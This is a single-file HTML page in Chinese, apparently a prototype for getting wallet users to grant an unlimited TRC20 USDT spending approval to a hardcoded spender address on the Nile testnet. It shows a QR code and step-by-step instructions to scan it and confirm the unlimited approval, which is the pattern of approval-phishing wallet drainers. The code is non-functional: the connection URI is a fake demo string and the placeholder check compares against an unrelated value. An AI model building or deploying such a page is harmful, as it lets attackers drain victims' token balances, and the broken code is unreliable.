<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USDT 无限授权 - WalletConnect 版</title>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <style>
    body { font-family: system-ui; text-align: center; padding: 30px; background: #f0f8ff; }
    h1 { color: #0066cc; }
    button { padding: 18px 40px; font-size: 22px; margin: 20px; background: #00bfff; color: white; border: none; border-radius: 12px; cursor: pointer; }
    #log { background: white; padding: 25px; margin: 25px auto; max-width: 700px; border-radius: 10px; text-align: left; line-height: 1.6; border: 1px solid #ccc; }
    #qrcode { margin: 30px auto; padding: 15px; background: white; display: inline-block; border-radius: 10px; }
  </style>
</head>
<body>
  <h1>TRC20 USDT 无限授权（Nile 测试网）</h1>
  <p>spender 地址：<strong>TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3</strong></p>
  <p>支持：TokenPocket、imToken、Bitpie、Trust Wallet、MetaMask</p>

  <button onclick="startWalletConnectApprove()">点击授权无限 USDT（WalletConnect）</button>

  <div id="log">点击按钮后会尝试连接 WalletConnect。<br>iOS 上可能显示二维码，请用钱包扫码。</div>
  <div id="qrcode"></div>

  <script>
    const log = document.getElementById("log");
    const qrContainer = document.getElementById("qrcode");

    async function startWalletConnectApprove() {
      log.innerHTML = "正在准备 WalletConnect 连接...<br>请确保钱包切换到 Nile 测试网";

      // ================== 需要替换的部分 ==================
      // 把下面这行 "YOUR_PROJECT_ID_HERE" 替换成你从 https://cloud.walletconnect.com 拿到的真实 Project ID
      const projectId = "YOUR_PROJECT_ID_HERE";   
      // ====================================================

      if (projectId === "0b000f63377468de77fcb2db91bdb522") {
        log.innerHTML += "<br><br>❌ 请先替换 Project ID！<br>去 https://cloud.walletconnect.com 创建项目并复制 ID，然后粘贴到代码里。";
        alert("请先把代码里的 YOUR_PROJECT_ID_HERE 替换成你的真实 Project ID");
        return;
      }

      // 这里是简化演示（实际完整集成需要更多库，单文件很难实现）
      // 目前显示提示 + QR 码让你测试扫码流程
      const demoWcUri = `wc:demo1234567890abcdef@2?projectId=${projectId}&relay-protocol=irn`;

      qrContainer.innerHTML = "";
      new QRCode(qrContainer, {
        text: demoWcUri,
        width: 280,
        height: 280
      });

      log.innerHTML += `<br><br>✅ QR 码已生成！<br>
      操作步骤（iOS）：<br>
      1. 打开 TokenPocket / imToken / Trust Wallet / MetaMask 等 App<br>
      2. 点击右上角「扫一扫」或「WalletConnect / 连接 DApp」<br>
      3. 扫上方二维码<br>
      4. 钱包弹出授权页面后确认即可（approve 无限 USDT）`;

      alert("二维码生成成功！请用你的钱包 App 扫码测试授权。");
    }
  </script>
</body>
</html>
